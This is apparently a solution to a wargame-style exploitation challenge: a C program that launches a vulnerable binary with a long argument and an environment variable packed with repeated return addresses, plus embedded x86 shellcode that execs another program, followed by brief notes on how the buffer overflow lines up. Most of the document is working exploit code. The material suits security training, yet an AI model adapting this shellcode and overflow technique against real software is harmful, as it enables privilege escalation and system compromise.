#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define VULN "/var/challenge/level9/9"

char mc[] = "\x31\xc0\x31\xc9\x31\xd2\x50\x68\x6c\x33\x33\x74\x68\x69\x6e\x2f\x2f\x68\x61\x6c\x2f\x62\x68\x2f\x6c\x6f\x63\x68\x2f\x75\x73\x72\x89\xe3\xb0\x0b\xcd\x80";

int main()
{
	char *prm1 = "2",
	     *prm2 = "16",
	     *prm3 = "11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111";
	     char *prgwprm[] = {VULN, prm1, prm2, prm3, NULL};
	char *envp[] = {"SEPARATOR=\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf\xb9\xff\xff\xbf",mc, NULL};

	execve(prgwprm[0], prgwprm, envp);
	return 0;
}

Steps:
The exploit program converts argv[3] from binary to hex. 1s were used as it is a legal binary character,
and 260 1s were used to require less SEPARATOR bytes in the buffer â€“ to then overflow.
I specified the SEPARATOR string as an environment parameter and declared it as 256 bytes (truncated to 255), being the repeated <shellcode>. 
This way, if a valid address was needed by the program, one would be seen, I.e., no segfault would occur. Finally, the <shellcode> would overwrite the outvalue variable,
wherever it would be in memory. 

260 1s, although an arbitrary value at first, aligns the <shellcode> to overwrite correctly 